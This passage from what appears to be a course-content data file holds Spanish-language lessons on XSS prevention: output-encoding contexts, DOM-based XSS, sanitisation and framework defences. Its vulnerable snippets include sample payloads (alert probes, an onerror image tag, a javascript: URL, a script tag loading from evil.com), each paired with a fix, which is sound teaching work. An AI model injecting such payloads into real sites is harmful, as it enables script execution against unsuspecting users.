          <strong>¡Importante!</strong> Siempre rodear los valores de atributos con comillas, incluso si parecen seguros. Y escapar cualquier comilla presente en el valor.
        </div>

        <p>Por ejemplo:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;!-- Vulnerable --&gt;
&lt;div class=&lt;?php echo $clase ?&gt;&gt;&lt;/div&gt;</code></pre>

        <pre><code class="language-html highlight-secure">&lt;!-- Seguro --&gt;
&lt;div class="&lt;?php echo htmlspecialchars($clase, ENT_QUOTES) ?&gt;"&gt;&lt;/div&gt;</code></pre>

        <p>
          En el primer caso, si <code>$clase</code> es algo como <code>onmouseover="alert(1)</code> se inyecta un atributo <code>onmouseover</code>. En el segundo, con comillas y escape, el payload no puede romper el atributo.
        </p>

        <p>
          Además, ciertos atributos son inherentemente peligrosos si contienen datos no controlados: por ejemplo, cualquier atributo que inicie con <code>on</code> (eventos como <code>onerror</code>, <code>onclick</code>) ejecuta JavaScript, o atributos como <code>src</code> en un <code>&lt;script&gt;</code> o <code>href</code> en <code>&lt;iframe&gt;</code> pueden introducir scripts.
        </p>

        <h3>3. Contexto URL</h3>
        <p>
          Cuando la salida dinámica va dentro de una URL (ej. <code>&lt;a href="..."&gt;</code> o <code>&lt;form action="..."&gt;</code>), existe el riesgo de que un atacante provea una URL maliciosa. Un caso es inyectar un URL con el esquema <code>javascript:</code> en un enlace, convirtiéndolo en un disparador de código en lugar de un enlace real.
        </p>

        <pre><code class="language-html highlight-vulnerable">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</code></pre>

        <p>
          Para evitarlo, se debe validar y restringir URLs – por ejemplo, solo permitir ciertos esquemas (<code>http</code>, <code>https</code>) y dominios esperados. Además, se debe usar codificación URL para componentes variables de la URL (como parámetros de consulta), a fin de prevenir inyecciones que corten la URL o introduzcan parámetros inesperados.
        </p>

        <h3>4. Contexto JavaScript</h3>
        <p>Este es crítico: si se inserta texto del usuario dentro de un bloque <code>&lt;script&gt;</code> o dentro de un código JS en línea, se corre un altísimo riesgo. Por ejemplo:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;script&gt;
    var mensaje = "[dato]";
    alert(mensaje);
&lt;/script&gt;</code></pre>

        <p>Si <code>[dato]</code> contiene <code>"; alert('XSS');//</code>, entonces el código resultante será:</p>

        <pre><code class="language-javascript">var mensaje = ""; alert('XSS');//";
alert(mensaje);</code></pre>

        <p>
          El atacante cerró la cadena de texto y ejecutó su propio <code>alert('XSS')</code>. En JavaScript, además de escapar <code>&lt;/&gt;</code> (para no cerrar <code>&lt;script&gt;</code>), necesitamos escapar las comillas dentro de las cadenas y caracteres de escape como <code>\</code>.
        </p>

        <p>Una estrategia es no construir JavaScript con datos inseguros. Si se necesita usar un valor proporcionado por el usuario en código JS, lo más seguro es pasarlo como data y no como código. Por ejemplo, usar <code>JSON.stringify()</code> para insertar un objeto/valor:</p>

        <pre><code class="language-html highlight-secure">&lt;script&gt;
    var mensaje = JSON.parse('&lt;?php echo json_encode($dato) ?&gt;');
    alert(mensaje);
&lt;/script&gt;</code></pre>

        <p>
          Por último, evitar totalmente funciones dinámicas como <code>eval()</code> o <code>new Function()</code> con contenido de usuario. Estas son peligrosas por diseño – incluso si escapas, es muy fácil cometer errores.
        </p>

        <h3>5. Contexto CSS</h3>
        <p>
          CSS también puede ser un vector, aunque menos común. En hojas de estilo en línea, un atacante podría romper la sintaxis CSS e inyectar algo malicioso. En versiones antiguas de IE, existía <code>expression()</code> en CSS para ejecutar JavaScript dentro de estilos (afortunadamente obsoleto).
        </p>

        <p>
          Aún así, se debe escapar caracteres como <code>&lt;/style&gt;</code> si se construye CSS mediante strings, para que no cierren la etiqueta de estilo. Además, en atributos <code>style</code> o etiquetas <code>&lt;style&gt;</code>, evitar inserción de <code>url(</code> con datos no validados, ya que <code>url(javascript:codigo)</code> sería ejecutable.
        </p>

        <p>
          Si necesitas insertar valores en CSS (como colores, tamaños), valida estrictamente que sean solo números o letras (ej. usando una expresión regular para hex de color, etc.).
        </p>

        <h2>Ejemplos de errores por contexto</h2>
        <p>Para afianzar, veamos errores comunes al manejar contextos y cómo evitarlos:</p>

        <h3>No escapar en contexto de atributo (y sin comillas)</h3>
        <p>
          Ya lo mencionamos, un clásico es construir algo como <code>&lt;input value=&lt;?php echo $nombre ?&gt;&gt;</code>. Si <code>$nombre</code> contiene una comilla, cierra el atributo. Solución: siempre usar comillas alrededor de los valores y escaparlos.
        </p>

        <h3>Escape HTML aplicado en contexto errado</h3>
        <p>Imaginemos que sanitizamos una cadena para HTML y luego la usamos dentro de un <code>&lt;script&gt;</code>:</p>

        <pre><code class="language-php highlight-vulnerable">$safe = htmlspecialchars($userData);
echo "&lt;script&gt;var data = '$safe';&lt;/script&gt;";</code></pre>

        <p>
          Podría parecer seguro porque escapamos <code>&lt;</code> y <code>&gt;</code>. Pero si <code>$userData</code> contiene <code>';alert(1);//</code>, la variable JS terminará como <code>var data = '';alert(1);//';</code> – el <code>htmlspecialchars</code> no escapó la comilla simple ni evitó la nueva línea, causando ejecución.
        </p>

        <h3>Inyección en ruta de URL</h3>
        <p>
          Un caso sutil es cuando concatenan strings para formar URLs en páginas redireccionables o links de descarga. Ej: <code>echo "&lt;a href='/perfil/{$userName}'&gt;Perfil&lt;/a&gt;"</code>. Si <code>$userName</code> contiene <code>evil/../admin</code> podría alterar la ruta.
        </p>

        <h3>Uso de innerHTML con contenido de usuario</h3>
        <p>
          A veces el desarrollador confía porque "ya escapé en el servidor", pero luego en el cliente toma esa misma cadena y la asigna a <code>innerHTML</code>, provocando que el navegador la interprete nuevamente como HTML.
        </p>

        <h2>Buenas prácticas específicas de contexto</h2>
        <p>Para manejar correctamente los contextos de salida, ten en cuenta estas prácticas:</p>

        <ul>
          <li><strong>HTML:</strong> Usa siempre escape de entidades (<code>&lt;→&amp;lt;</code>, etc.) para cualquier texto inyectado en HTML. Esto previene inyecciones de etiquetas o HTML no deseado.</li>
          
          <li><strong>Atributos HTML:</strong> Encierra todos los valores de atributos entre comillas dobles (<code>atributo="valor"</code>) o simples, y escapa el valor para ese contexto (escapar <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code> principalmente). Evita insertar datos en atributos de eventos (<code>onload</code>, <code>onclick</code>) o <code>href</code> de <code>javascript:</code>.</li>
          
          <li><strong>JavaScript:</strong> Evita construir código con datos. Si es inevitable, escapa caracteres especiales de JS (<code>"'</code>, <code>\</code>, <code>&lt;</code>, <code>&gt;</code> etc.) y considera envolver en <code>JSON.stringify</code>. Mejor aún, restructura tu código para que los datos del servidor se inyecten como data (por ejemplo, en un atributo <code>data-</code> o en un objeto JSON inicial) y no como código ejecutable.</li>
          
          <li><strong>CSS:</strong> No insertes lógica dentro de CSS con datos usuarios. Limítate a valores simples (colores, pixeles) y aun así, valida el formato (ej. usar una lista blanca de palabras o patrón regex). Escapa caracteres como <code>&gt;</code> si estás generando estilo interno.</li>
          
          <li><strong>URL:</strong> Construye URLs usando las herramientas del lenguaje (evitando concatenación manual). Escapa partes variables con codificación URL para que caracteres especiales (espacios, <code>&amp;</code>, <code>=</code>, <code>%</code>, etc.) no rompan la sintaxis.</li>
          
          <li><strong>Utiliza librerías probadas:</strong> Por ejemplo, DOMPurify para sanitizar HTML si realmente necesitas incrustar HTML rico aportado por usuario (como en un editor de texto enriquecido). O las funciones de encoding de OWASP para cada contexto (disponibles en muchos lenguajes).</li>
        </ul>

        <div class="warning-box">
          <h4>Contextos "peligrosos" a evitar</h4>
          <p>Si es posible, nunca insertes datos no confiables en:</p>
          <ul>
            <li>Secciones <code>&lt;script&gt;</code></li>
            <li>Atributos de eventos (<code>onload</code>, <code>onclick</code>)</li>
            <li>Secciones <code>&lt;style&gt;</code></li>
            <li>URLs directas en <code>href</code> con <code>javascript:</code></li>
          </ul>
          <p>Simplemente es una mala práctica permitir eso, replantéa el diseño si te ves haciendo algo así.</p>
        </div>

        <h2>Resumen</h2>
        <p>
          En este módulo, profundizamos en por qué el contexto de salida determina la forma de protegernos contra XSS. Vimos que el navegador interpreta el contenido en diferentes contextos (HTML, atributo, URL, script, estilo), cada uno con su propia sintaxis y vectores de ataque.
        </p>

        <p>
          Aprendimos con ejemplos que escapar correctamente en un contexto pero usar ese resultado en otro puede fallar (por ejemplo, escape HTML no basta en contexto JavaScript). Por ello, adoptamos el enfoque de "lo correcto en el lugar correcto", utilizando escapes específicos o evitando ciertas construcciones por completo.
        </p>

        <p>
          La clave es nunca insertar datos sin escapar en el DOM sin antes preguntarse: <strong>¿Cómo va a leer esto el navegador?</strong>. Herramientas como las funciones de encoding de OWASP o sanitizadores nos ayudan a lidiar con esta complejidad, pero requieren que sepamos cuál aplicar.
        </p>

        <p>
          Esta comprensión de contextos nos prepara para el siguiente paso: implementar prevención sistemática de XSS, donde combinaremos validación, escape contextual y otras medidas de seguridad como Content Security Policy para bloquear cualquier intento residual de ejecución no autorizada.
        </p>
      `
    },
    'dom-xss-ejecucion-cliente': {
      id: 'dom-xss-ejecucion-cliente',
      title: 'XSS basado en DOM',
      description: 'Comprende cómo los scripts que manipulan el DOM pueden generar vulnerabilidades y aprende a manejar los datos del navegador de forma segura.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          En módulos previos distinguimos el XSS basado en DOM como una categoría particular en la que la vulnerabilidad no proviene directamente de la respuesta del servidor, sino de cómo el código JavaScript en el cliente maneja el contenido dinámico. Ahora profundizaremos en este tema.
        </p>

        <p>
          <strong>XSS basado en DOM (Document Object Model XSS)</strong> ocurre cuando el código del lado del cliente modifica la página de forma insegura utilizando datos que pueden ser influidos por un atacante, permitiendo la ejecución de código malicioso en el navegador. Aquí, el documento HTML original no necesariamente contiene el ataque; es el script en ejecución el que inserta o ejecuta algo indebido.
        </p>

        <p>
          DOM XSS se ha vuelto más relevante con el auge de aplicaciones web de una sola página (SPA) y pesadas en JavaScript. Incluso sitios tradicionales agregan muchas funcionalidades con JS, abriendo potenciales vías de XSS que no aparecen en el HTML inicial. Es importante entender que proteger solo el lado servidor no basta si el cliente introduce sus propios riesgos.
        </p>

        <h2>¿Cómo funciona el DOM XSS?</h2>
        <p>
          El ataque se basa en identificar <strong>fuentes</strong> en el entorno del navegador que un atacante pueda controlar, y <strong>sumideros</strong> en el código cliente donde esos datos se introducen en el DOM o se evalúan como código sin la debida sanitización.
        </p>

        <h3>Fuentes típicas controlables:</h3>
        <ul>
          <li><strong><code>window.location</code></strong> (y sus derivados <code>location.search</code>, <code>location.hash</code>, etc.): un atacante puede hacer que la víctima visite una URL manipulada con ciertos valores.</li>
          
          <li><strong><code>document.cookie</code>:</strong> Si bien el atacante externo no puede fijar cookies de otro dominio, podría aprovechar XSS reflejado previo para establecer cookies maliciosas que luego el propio sitio lea.</li>
          
          <li><strong>Almacenamiento Web:</strong> <code>localStorage/sessionStorage</code> si la aplicación guarda allí datos influenciados por usuario (por ejemplo, guardar un draft de comentario que pueda contener script).</li>
          
          <li><strong><code>document.referrer</code>:</strong> Si la víctima navega al sitio desde un enlace de terceros, el referrer puede contener cadenas que la página luego use.</li>
          
          <li><strong><code>window.name</code>:</strong> Este valor persiste mientras la pestaña esté abierta y puede ser establecido por un sitio malicioso antes de navegar a la página víctima.</li>
          
          <li><strong>Mensajes de otras ventanas:</strong> la API <code>postMessage</code> permite que una página reciba mensajes de otras; si el sitio procesa el <code>event.data</code> sin validar, es una vía.</li>
          
          <li><strong>Variables JavaScript globales:</strong> que puedan ser modificadas mediante interacciones previas (DOM clobbering, por ejemplo, donde elementos HTML con ciertos IDs sobreescriben variables globales).</li>
        </ul>

        <h3>Sumideros peligrosos:</h3>
        <ul>
          <li><strong><code>element.innerHTML / outerHTML / insertAdjacentHTML</code>:</strong> Insertan cadenas como HTML, interpretando etiquetas.</li>
          
          <li><strong><code>document.write() / document.writeln()</code>:</strong> Pueden escribir directamente en el documento (peligroso si se usan después de la carga inicial).</li>
          
          <li><strong><code>eval() / new Function() / setTimeout()</code> o <code>setInterval()</code> con string:</strong> Ejecutan texto como JavaScript.</li>
          
          <li><strong>Atributos de DOM:</strong> como <code>element.setAttribute('onclick', ...)</code> o asignar a <code>element.onclick = ...</code>: si el valor proviene del usuario, lo estás convirtiendo en código ejecutable.</li>
          
          <li><strong><code>location.href / location.assign</code>:</strong> redirigir con valores no confiables puede ser peligroso (open redirect), pero no ejecuta script en el mismo contexto.</li>
        </ul>

        <div class="warning-box">
          <p><strong>Nota:</strong> <code>Element.innerText/textContent</code> en general no ejecutan HTML (son seguros para texto), así que no son sumideros peligrosos. Al contrario, son alternativas seguras.</p>
        </div>

        <p>
          En resumen, DOM XSS sucede cuando combinas una fuente no confiable con un sumidero ejecutable sin limpieza de por medio.
        </p>

        <h2>Ejemplo detallado de DOM XSS</h2>
        <p>Retomemos y ampliemos el ejemplo ya visto: una página que muestra un mensaje de saludo tomando el valor de la URL hash:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;p id="saludo"&gt;&lt;/p&gt;
&lt;script&gt;
  const hash = window.location.hash;  // e.g. "#nombre=Juan"
  const params = new URLSearchParams(hash.slice(1));
  const nombre = params.get('nombre') || 'visitante';
  document.getElementById('saludo').innerHTML = "Hola, " + nombre;
&lt;/script&gt;</code></pre>

        <p>
          <strong>Análisis:</strong> La fuente aquí es <code>window.location.hash</code> (controlable vía URL). El sumidero es <code>innerHTML</code>. Si <code>nombre</code> contiene cualquier cadena con <code>&lt; &gt;</code>, eso insertará HTML arbitrario. Un atacante crea un enlace:
        </p>

        <pre><code>pagina.html#nombre=&lt;img src=x onerror=alert(1)&gt;</code></pre>

        <p>
          Cuando la víctima lo abre, el script toma <code>nombre = "&lt;img src=x onerror=alert(1)&gt;"</code> y lo inyecta. Se ejecuta el <code>alert(1)</code>. Este es un DOM XSS reflejado en el sentido de que proviene de la navegación actual, pero no involucró al servidor.
        </p>

        <h3>Prevención en este caso</h3>
        <p>Tan sencillo como usar <code>textContent</code> en lugar de <code>innerHTML</code> para ese propósito, ya que es solo texto:</p>

        <pre><code class="language-javascript highlight-secure">document.getElementById('saludo').textContent = "Hola, " + nombre;</code></pre>

        <p>
          Si quisiéramos permitir algo de HTML seguro (imaginemos que nombre pudiera contener etiquetas permitidas), entonces necesitamos sanitizar. Podríamos usar una biblioteca como DOMPurify:
        </p>

        <pre><code class="language-javascript highlight-secure">const nombreSeguro = DOMPurify.sanitize(nombre);
document.getElementById('saludo').innerHTML = "Hola, " + nombreSeguro;</code></pre>

        <p>
          DOMPurify eliminaría atributos como <code>onerror</code> y etiquetas no permitidas, neutralizando la carga maliciosa. En general, sin una librería robusta es muy difícil cubrir todos los casos manualmente, por lo que es preferible reestructurar el código para no necesitar insertar HTML arbitrario.
        </p>

        <h3>Otro ejemplo complejo</h3>
        <p>
          Supongamos un e-commerce con una funcionalidad de carrito en la que los productos en el carrito se almacenan en <code>localStorage</code> como JSON. En alguna parte, el sitio lee <code>localStorage.getItem('carrito')</code> y luego usa <code>innerHTML</code> para volcar los nombres de productos en una lista.
        </p>

        <p>
          Si un atacante lograra que la víctima ejecute primero un payload que escriba una entrada maliciosa en <code>localStorage</code> (quizá mediante otra XSS o extensión maliciosa), cuando la página cargue, leerá ese valor y lo inyectará. Es un escenario más complejo, pero muestra que DOM XSS puede venir de fuentes indirectas.
        </p>

        <h3>Librerías y frameworks</h3>
        <p>
          Muchas vulnerabilidades DOM XSS han sido encontradas en librerías populares. Por ejemplo, antiguas versiones de jQuery manipulaban HTML de formas que podían ser peligrosas si se les pasaba contenido no validado (métodos como <code>$().html()</code> con entrada de usuario, o <code>$.parseHTML()</code> podrían ser explotados).
        </p>

        <p>
          AngularJS (la versión 1.x) tuvo famosamente vectores de XSS vía expresiones interpoladas en bindings antes de endurecer su sandbox. Incluso hoy, si un desarrollador Angular desactiva la sanitización para contenido arbitrario (usando <code>bypassSecurityTrust...</code>), podría introducir XSS.
        </p>

        <p>
          Lo mismo con React: si usas <code>dangerouslySetInnerHTML</code> con datos no filtrados, básicamente es un DOM XSS directo.
        </p>

        <h2>Cómo prevenir DOM XSS</h2>
        <p>Muchas técnicas se solapan con lo ya visto en contexto de salida, pero enfatizamos las siguientes relativas al código cliente:</p>

        <h3>1. Evitar funciones inseguras</h3>
        <p>
          Reduce al mínimo el uso de <code>innerHTML</code> y similares. Si necesitas crear nodos, usa métodos DOM seguros: <code>createElement</code>, <code>appendChild</code>, <code>textContent</code> para texto, etc.
        </p>

        <p>Por ejemplo, en vez de:</p>
        <pre><code class="language-javascript highlight-vulnerable">lista.innerHTML += "&lt;li&gt;" + item + "&lt;/li&gt;";</code></pre>

        <p>Haz:</p>
        <pre><code class="language-javascript highlight-secure">let li = document.createElement('li');
li.textContent = item;
lista.appendChild(li);</code></pre>

        <h3>2. Validar fuentes en el cliente</h3>
        <p>
          Si tomas datos de <code>location</code> o <code>postMessage</code>, aplica validaciones en JavaScript también. Por ejemplo, si esperas un número en <code>location.hash</code>, comprueba con una expresión regular que solo contenga dígitos antes de usarlo.
        </p>

        <div class="warning-box">
          <p><strong>¡Nunca hagas esto!</strong> <code>eval(location.hash)</code> - eso es suicida en términos de seguridad.</p>
        </div>

        <h3>3. Cuidado con templating del lado cliente</h3>
        <p>
          Si usas libs de templates en el navegador (Mustache, Handlebars, etc.), verifica que escapen por defecto. La mayoría lo hace para HTML, pero ojo si la plantilla inserta algo en un atributo estilo o script.
        </p>

        <p>
          Mantén la lógica de templates simple; para cualquier cosa más allá de HTML plano (como atributos <code>onevento</code>), construye esos elementos vía código en lugar de plantillas.
        </p>

        <h3>4. Implementa Content Security Policy (CSP)</h3>
        <p>
          Aunque lo veremos en detalle en el siguiente módulo, mencionar que una política CSP fuerte puede impedir la ejecución de ciertas cargas en DOM XSS. Por ejemplo, CSP puede bloquear la ejecución de <code>eval</code> o la carga de scripts externos incluso si se inyectan.
        </p>

        <p>
          No previene la manipulación del DOM per se, pero limita qué tan dañino puede ser (si se inyecta un <code>&lt;script src="https://evil.com/x.js"&gt;</code> pero CSP solo permite scripts de tu dominio, no se cargará). CSP es una red de seguridad cuando la prevención primaria falla.
        </p>

        <h3>5. Usa herramientas de análisis</h3>
        <p>
          Para desarrollo, aprovecha herramientas estáticas/dinámicas. Por ejemplo, ESLint con plugins de seguridad puede advertir sobre usos de <code>innerHTML</code> o <code>eval</code>. Hay scanners dedicados (Burp Suite y OWASP ZAP tienen scripts para buscar DOM XSS, aunque a veces requieren intervención manual).
        </p>

        <p>
          Chrome DevTools tiene una opción de monitorear Trusted Types violations que puede resaltar lugares donde se asignan strings inseguros a sinks, si tienes Trusted Types configurado.
        </p>

        <h3>6. Trusted Types</h3>
        <p>
          Vale la pena mencionar esta nueva API web: permite que tu aplicación declare (vía CSP) que solo aceptará objetos especiales (<code>TrustedHTML</code>, <code>TrustedScript</code>, etc.) en funciones como <code>innerHTML/eval</code>.
        </p>

        <p>
          Entonces, aunque un atacante logre inyectar un string, el navegador lo rechazará a menos que tu código explícitamente lo marque como seguro usando una política de sanitización. Implementar Trusted Types requiere cambios en el código, pero es una poderosa mitigación de DOM XSS de última generación.
        </p>

        <h2>Resumen</h2>
        <p>
          El XSS basado en DOM nos recuerda que la seguridad no termina en el servidor. Un sitio perfectamente protegido en sus respuestas puede volverse vulnerable si su JavaScript interno no aplica las mismas precauciones.
        </p>

        <p>
          En este módulo, identificamos las fuentes y sumideros comunes de DOM XSS, presentamos ejemplos de cómo un inocente <code>innerHTML</code> puede ser una puerta trasera, y recalcamos las formas de prevención: evitar métodos inseguros, usar alternativas seguras para manipular DOM, validar datos en el cliente y apoyarse en políticas de seguridad del navegador como CSP y Trusted Types.
        </p>

        <p>
          Con esto, completamos el panorama de los tipos de XSS: reflejado, almacenado y DOM. Ya conocemos qué es XSS, sus variantes y cómo manejar contextos de salida. En el siguiente módulo abordaremos la prevención de XSS de forma integral, consolidando técnicas tanto en frontend como backend para minimizar la posibilidad de inyección de scripts.
        </p>

        <p>
          Empezaremos a armar un plan defensivo completo que incluya validación, escape, sanitización, políticas de seguridad y más, de modo que nuestras aplicaciones queden lo más blindadas posible contra este tipo de ataque.
        </p>
      `
    },
    'prevencion-xss': {
      id: 'prevencion-xss',
      title: 'Prevención de XSS',
      description: 'Conoce las estrategias más efectivas para prevenir ataques XSS, como el escapado por contexto, la validación de entradas y el uso de APIs seguras.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Hasta ahora hemos descrito el problema de XSS desde varios ángulos; ahora nos centraremos en las soluciones prácticas para prevenirlo. La prevención de XSS se basa en una combinación de estrategias, ya mencionadas parcialmente: validar la entrada, escapar o sanitizar la salida según contexto, utilizar herramientas y frameworks seguros, y añadir capas defensivas adicionales (como políticas de contenido o cabeceras especiales) para mitigar errores.
        </p>

        <p>
          En este módulo presentaremos un enfoque sistemático para incorporar estas defensas en el ciclo de desarrollo. Recordemos que no existe una única función para bloquear los ataques XSS; es más bien una serie de buenas prácticas consistentes aplicadas en todos los lugares donde interactuamos con datos del usuario.
        </p>

        <h2>Reglas fundamentales de prevención</h2>
        <p>OWASP propone varias reglas generales para prevenir XSS. Las podemos resumir así:</p>

        <ol>
          <li><strong>No insertes datos no confiables excepto en lugares que estés preparado para proteger.</strong> (Si puedes, diseña la aplicación para que nunca necesites insertar HTML crudo del usuario; si debes, entonces asegúrate de los siguientes pasos).</li>
          
          <li><strong>Escapa siempre los caracteres especiales antes de insertar datos no confiables en el HTML</strong> (y usa la función de escape correcta para el contexto apropiado, como vimos en el módulo de contextos).</li>
          
          <li><strong>Valida las entradas del usuario y rechaza lo que no cumpla con los criterios esperados</strong> (longitud, formato, tipo, caracteres permitidos). Usa listas blancas (whitelists) en lugar de listas negras. Esto no reemplaza el escape, pero añade seguridad.</li>
          
          <li><strong>Sanitiza activamente si debes permitir cierto HTML/Markdown:</strong> Si tu app permite que el usuario publique contenido enriquecido, utiliza librerías de sanitización para eliminar o neutralizar lo peligroso. No intentes escribir tu propio limpiador HTML.</li>
          
          <li><strong>Evita funciones propensas a XSS:</strong> No uses <code>eval</code> con input, no construyas HTML con concatenación de strings, no uses <code>innerHTML</code> directamente con datos crudos, etc.</li>
          
          <li><strong>Utiliza tecnologías de seguridad complementarias:</strong> Aquí entra Content Security Policy (CSP) y la bandera HttpOnly en cookies. CSP puede impedir mucha ejecución no autorizada y HttpOnly impide que JavaScript lea las cookies de sesión.</li>
          
          <li><strong>Mantén una cultura de seguridad en el código:</strong> Revisa regularmente el código en busca de patrones peligrosos, usa análisis estático, actualiza librerías y capacita a tu equipo en estas prácticas.</li>
        </ol>

        <h2>Validación de entrada (primer filtro)</h2>
        <p>
          La validación de entrada por sí sola no garantiza eliminar XSS (ya que siempre podría haber algún vector ingenioso), pero es una importante primera capa. Ejemplo: Si tienes un campo "Nombre" que esperas solo letras y espacios, imponlo. Podrías usar una expresión regular <code>/^[A-Za-zÁÉÍÓÚáéíóúñÑ ]+$/</code> para validar. Así, una entrada con <code>&lt;script&gt;</code> sería rechazada por contener caracteres inválidos.
        </p>

        <p>En servidores típicos:</p>
        <ul>
          <li><strong>En PHP:</strong> usar <code>filter_input</code> con filtros apropiados</li>
          <li><strong>En .NET:</strong> las DataAnnotations <code>[RegularExpression]</code>, <code>[StringLength]</code>, etc.</li>
          <li><strong>En Java:</strong> usar Bean Validation (JSR 303) o manualmente chequear strings</li>
        </ul>

        <h3>Lista blanca vs lista negra</h3>
        <p>
          Siempre que sea viable, preferir lista blanca. Por ejemplo, en un foro, en vez de buscar <code>&lt;script&gt;</code> para bloquearlo (lista negra insuficiente), es mejor eliminar todo HTML excepto quizás <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;a&gt;</code> permitidos (lista blanca de etiquetas seguras).
        </p>

        <p>
          Existen librerías (AntiSamy de OWASP, HTML Sanitizer, etc.) que tienen políticas de limpieza definibles para este fin. Validar entrada también incluye longitud (limitar a un tamaño razonable dificulta payloads gigantes o técnicas de ofuscación).
        </p>

        <div class="warning-box">
          <p><strong>Ejemplo de error mitigado por validación:</strong> Supongamos un campo de cantidad (número entero). Sin validación, un atacante podría enviar <code>1">&lt;script&gt;alert(1)&lt;/script&gt;</code> esperando que en alguna parte ese valor se inserte. Si validamos que es dígito, la carga no pasará.</p>
        </div>

        <h2>Escape de salida (la barrera principal)</h2>
        <p>
          Esta es la medida más efectiva y necesaria en todos los casos: escapar los caracteres especiales antes de volcar datos al HTML/JS. Ya lo cubrimos en detalle en el módulo de contextos. A modo de resumen práctico:
        </p>

        <ul>
          <li><strong>En HTML:</strong> usar funciones de la plataforma (por ejemplo <code>htmlspecialchars</code> en PHP, <code>HTMLEncode</code> en .NET, escape en algunas plantillas JS).</li>
          <li><strong>En JavaScript:</strong> envolver datos en <code>JSON.stringify</code> o usar un escape para JavaScript.</li>
          <li><strong>En URLs:</strong> usar <code>urlencode/encodeURIComponent</code> según el caso.</li>
          <li><strong>En atributos HTML:</strong> escapa y pon comillas.</li>
          <li><strong>En CSS:</strong> idealmente no inyectar, pero hay <code>encodeForCSS</code> en librerías si se requiere.</li>
        </ul>

        <h3>Ejemplo en plantilla server-side</h3>
        <p>
          Django (Python) automáticamente escapa variables en sus plantillas. Lo mismo Blade en Laravel, Twig en Symfony, etc. Sin embargo, suelen ofrecer un "escape hatch" – una manera de deshabilitar el escape cuando crees que no lo necesitas (por ejemplo, <code>{!! $var !!}</code> en Blade imprime sin escapar).
        </p>

        <div class="warning-box">
          <p><strong>¡Cuidado!</strong> No uses la impresión sin escape a menos que estés insertando HTML generado por tu propia aplicación de forma segura. Muchos incidentes XSS ocurren porque un desarrollador usó salida sin escapar para "tener texto con formato" pero terminó mostrando también scripts de usuarios.</p>
        </div>

        <h3>Cuidado con dobles escapes</h3>
        <p>
          Si escapas dos veces, el usuario verá los caracteres <code>&amp;lt;</code> en la página, lo cual es mejor que XSS, pero luce mal. Trata de escapar una vez en el punto de salida final. Si por arquitectura ya te llega escapado un valor, no lo vuelvas a escapar (pero asegúrate de documentar ese comportamiento).
        </p>

        <h2>Sanitización de contenido</h2>
        <p>
          La sanitización es necesaria cuando quieres permitir contenido enriquecido aportado por el usuario. Un caso es sistemas de foros, blogs donde usuarios pueden incluir ciertas etiquetas (en negrita, enlaces, listas, etc.). Aquí, aplicar un escape genérico arruinaría el formato (mostraría las etiquetas en vez de aplicarlas).
        </p>

        <p>
          Por lo tanto, se utiliza un sanitizador HTML: este software analiza el HTML de entrada y remueve o neutraliza todo lo que sea peligroso (scripts, iframes, eventos on*, CSS potentes) dejando solo un subconjunto considerado seguro.
        </p>

        <h3>Ejemplos de sanitizadores</h3>
        <ul>
          <li><strong>DOMPurify (JS):</strong> altamente recomendado y fácil de usar en aplicaciones web modernas. Tú le pasas una cadena de HTML potencialmente sucia y te devuelve una limpia.</li>
          <li><strong>OWASP AntiSamy:</strong> disponible para Java/.NET, con políticas configurables (definir qué tags/atributos se permiten).</li>
          <li><strong>Bleach (Python), sanitize-html (Node):</strong> otras opciones populares.</li>
        </ul>

        <p>
          <strong>Importante:</strong> Sanitizar no reemplaza el escape al mostrar, pero si haces sanitización correcta en cuanto recibes/almacenas el contenido, podrías almacenar una versión ya segura. Aun así, lo típico es: al renderizar, tomas el HTML permitido y lo insertas tal cual (sin escape, porque quieres que se interpreten las etiquetas permitidas).
        </p>

        <h3>Ejemplo de sanitización</h3>
        <p>Un usuario publica: <code>&lt;b&gt;Hola&lt;/b&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>. El sanitizador elimina <code>&lt;script&gt;</code> por completo y deja <code>&lt;b&gt;Hola&lt;/b&gt;</code>. Al mostrar, esa cadena ya no tiene nada peligroso y se puede insertar con <code>innerHTML</code> o entregarla del servidor tal cual.</p>

        <div class="warning-box">
          <p><strong>Nota importante:</strong> Sanitizar es complejo – nuevos vectores pueden aparecer. Por eso delegamos a librerías mantenidas por expertos, que se actualizan cuando surgen nuevas técnicas.</p>
        </div>

        <h2>Uso seguro de bibliotecas y frameworks</h2>
        <p>Una gran parte de la prevención es aprovechar las características de seguridad de los frameworks en lugar de evitarlas. Algunas recomendaciones:</p>

        <h3>Plantillas server-side</h3>
        <p>
          Deja que escapen automáticamente. No introduzcas salida sin escape a menos que sea indispensable. Si lo haces, pasa el contenido por un sanitizador antes de marcarlo como "seguro". Muchos frameworks permiten marcar un string como seguro (ej: safe filter en Django) – pero eso es prometer que tú lo limpiaste.
        </p>

        <h3>Frameworks front-end (React, Angular, Vue)</h3>
        <ul>
          <li><strong>En React:</strong> las variables interpoladas en JSX se escapan por defecto. <code>&lt;div&gt;{userInput}&lt;/div&gt;</code> es seguro. No uses <code>dangerouslySetInnerHTML</code> a menos que realmente tengas HTML que sabes que es seguro.</li>
          
          <li><strong>En Angular:</strong> por defecto su data-binding es seguro. Angular tiene su servicio <code>DomSanitizer</code> para casos donde quieres permitir HTML. Nunca hagas <code>Sanitizer.bypassSecurityTrustHtml(userHtml)</code> sin sanitizar ese HTML.</li>
          
          <li><strong>En Vue.js:</strong> también escapa inserciones moustache <code>{{ }}</code> automáticamente. Si necesitas insertar HTML, usar <code>v-html</code> directive, pero pasarle contenido ya filtrado.</li>
          
          <li><strong>Con jQuery u otras libs:</strong> evita funciones que interpreten HTML de strings arbitrarias. Usar <code>.text(data)</code> en vez de <code>.html(data)</code> para texto plano.</li>
        </ul>

        <h3>Actualizaciones</h3>
        <p>
          Mantén tus frameworks actualizados. Ha habido casos donde XSS era posible por fallos en librerías. Los parches suelen mejorar la sanitización o cerrar agujeros.
        </p>

        <h2>Defense-in-Depth: CSP y HttpOnly (introducción)</h2>
        <p>Aunque tenemos un módulo dedicado a CSP y cabeceras, vale la pena mencionarlas brevemente como parte de la prevención global:</p>

